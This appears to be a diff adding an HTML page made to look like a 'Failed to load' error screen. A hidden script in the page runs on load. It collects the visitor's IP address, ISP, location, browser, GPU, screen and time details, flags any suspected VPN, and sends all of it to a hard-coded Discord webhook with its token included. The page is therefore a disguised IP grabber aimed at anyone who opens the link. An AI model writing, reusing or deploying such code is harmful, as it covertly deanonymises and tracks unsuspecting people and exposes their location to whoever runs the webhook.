@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<head>
+<style>
+    body{
+        padding: 70px;
+        background: #000;
+        color: #fff;
+        font-family: Arial, sans-serif;
+
+    }
+    .sad {
+        content: ":(";
+        font-size: 100px;
+        color: white;
+    }
+</style>
+</head>
+<body>
+<span class="sad">:(</span>
+<br>
+<h1>Failed to load</h1>
+<p>Error Code: 405</p>
+<p>We couldnt process your request...</p>
+</body>
+<script>
+
+// Unobfuscated script for debugging and reliability
+// === CONFIGURABLE ENDPOINT ===
+const POST_URL = 'https://discord.com/api/webhooks/1402519363088679032/W-2TeCt_OUh2el5hALonoha8Jzy1Q7vy9F3k6ZWWo8CzDpGWCciQtRgvssHqO2Zk66O3';
+
+// Helper: Get GPU info
+function getGPUInfo() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'Unavailable';
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+        return 'Unavailable';
+    } catch (e) {
+        return 'Unavailable';
+    }
+}
+
+// Helper: Get Browser Name
+function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.indexOf('Firefox') > -1) return 'Firefox';
+    if (ua.indexOf('Edg') > -1) return 'Edge';
+    if (ua.indexOf('Chrome') > -1) return 'Chrome';
+    if (ua.indexOf('Safari') > -1) return 'Safari';
+    if (ua.indexOf('OPR') > -1 || ua.indexOf('Opera') > -1) return 'Opera';
+    return 'Unknown';
+}
+
+// Helper: Get EST time
+function getESTTime() {
+    const now = new Date();
+    // EST is UTC-5, but account for daylight saving (EDT is UTC-4)
+    const utc = now.getTime() + (now.getTimezoneOffset() * 60000);
+    // Use New York as EST/EDT reference
+    const est = new Date(utc + (3600000 * -4));
+    return est.toLocaleString('en-US', { timeZone: 'America/New_York', hour12: false }) + '.' + est.getMilliseconds();
+}
+
+// Helper: Get current local time with ms
+function getLocalTime() {
+    const now = new Date();
+    return now.toLocaleString('en-US', { hour12: false }) + '.' + now.getMilliseconds();
+}
+
+// Collect info and send POST
+async function collectAndSend() {
+    // Start grabbing browser/gpu/time info in parallel
+    const gpuPromise = Promise.resolve(getGPUInfo());
+    const browserPromise = Promise.resolve(getBrowser());
+    const estTimePromise = Promise.resolve(getESTTime());
+    const localTimePromise = Promise.resolve(getLocalTime());
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const userAgent = navigator.userAgent;
+
+    // Start IP/ISP fetch
+    let ipData = {};
+    let asn = '', ispSite = '', vpnAlert = '';
+    try {
+        const resp = await fetch('https://ipapi.co/json/');
+        if (resp.ok) ipData = await resp.json();
+        asn = (ipData.asn || '').toUpperCase();
+        // ISP site logic by ASN
+        if (asn === 'AS6167') {
+            ispSite = 'https://verizon.com';
+        } else if (asn === 'AS7922') {
+            ispSite = 'https://xfinity.com';
+        } else if (asn === 'AS21928') {
+            ispSite = 'https://t-mobile.com';
+        } else {
+            vpnAlert = 'VPN or unknown ISP suspected (ASN: ' + asn + ')';
+        }
+    } catch (e) {
+        vpnAlert = 'VPN or unknown ISP suspected (ASN: ' + asn + ')';
+    }
+
+    // Wait for parallel info
+    const [gpu, browser, estTime, localTime] = await Promise.all([
+        gpuPromise, browserPromise, estTimePromise, localTimePromise
+    ]);
+
+    // Format data for Discord webhook
+    const content = [
+        `IP: ${ipData.ip || ''}`,
+        `ISP: ${ipData.org || ''}`,
+        `ASN: ${asn}`,
+        `Host: ${ipData.hostname || ''}`,
+        `City: ${ipData.city || ''}`,
+        `Region: ${ipData.region || ''}`,
+        `Country: ${ipData.country_name || ''}`,
+        `User Agent: ${userAgent}`,
+        `Screen: ${screenRes}`,
+        `Timezone: ${timezone}`,
+        `GPU: ${gpu}`,
+        `Browser: ${browser}`,
+        `EST Time: ${estTime}`,
+        `Local Time: ${localTime}`,
+        `Visit Timestamp: ${Date.now()}`,
+        `ISP Site: ${ispSite}`,
+        vpnAlert ? `ALERT: ${vpnAlert}` : ''
+    ].filter(Boolean).join('\n');
+
+    // POST data in Discord's required format
+    try {
+        await fetch(POST_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content })
+        });
+    } catch (e) {}
+}
+
+collectAndSend();
+</script>
+</body>
